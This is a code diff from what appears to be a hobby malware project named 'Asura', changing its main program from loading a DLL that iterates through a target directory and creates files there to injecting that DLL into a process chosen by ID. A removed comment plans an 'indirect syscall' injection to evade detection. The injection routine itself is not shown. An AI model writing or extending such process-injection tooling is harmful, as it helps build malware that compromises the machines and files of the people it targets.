@@ -1,36 +1,34 @@
 #include "asurautils.h"
+#include "eibon_no_sho.h"
 
-int main()
+int main(int argc, char *argv[])
 {
-    HMODULE dllHandle = LoadLibraryA("AsuraDll.dll");
+    //HMODULE dllHandle = LoadLibraryA("AsuraDll.dll");
 
-    if(dllHandle == NULL){
+    /*if(dllHandle == NULL){
         printf("Error when loading asuralib, error: 0x%lx\n", GetLastError());
         return 1;
-    }
+    }*/
 
-    // make a DLL Injection here, if it works, transform it in a indirect syscall dll injection, lol
-    PfileCreation thfileCreation = (PfileCreation)GetProcAddress(dllHandle, "fileCreation");
-    Piterate_sub thiterate_subdirs = (Piterate_sub)GetProcAddress(dllHandle, "iterate_subdirs");
-
-    if (thfileCreation == NULL){
-        printf("Error when exporting functions, error: 0x%lx", GetLastError());
-        return 1;
-    }
-    if (thiterate_subdirs == NULL)
+    if (argc < 2)
     {
-        printf("Error when exporting functions, error: 0x%lx", GetLastError());
-        return 1;
+        printf("usage: \"%s\" PID", argv[0]);
+        return EXIT_FAILURE;
     }
 
-    std::string path_dot = "path_to_target_dir";
+    /*
+    WCHAR DLL[MAX_PATH] = L"C:\\Users\\thirras\\Desktop\\kishin\\Asura\\AsuraDll.dll";
+    SIZE_T DllPathSize = sizeof(DLL);
+    std::string path_dot = "C:\\Users\\thirras\\Desktop\\DANGEROUSTEST";
     printf("Calling iteration_subdirs...\n");
     //thfileCreation(path_dot);
     std::vector<std::string> dirs;
-    thiterate_subdirs(path_dot, dirs);
-    printf("thfileCreation succesfully called.\n");
+    //thiterate_subdirs(path_dot, dirs);
+    */
+    dll_injection(atoi(argv[1]));
+    printf("dll succesfully injected.\n");
     while(true){}
-    FreeLibrary(dllHandle);
+    //FreeLibrary(dllHandle);
     //{...}
 
     /*
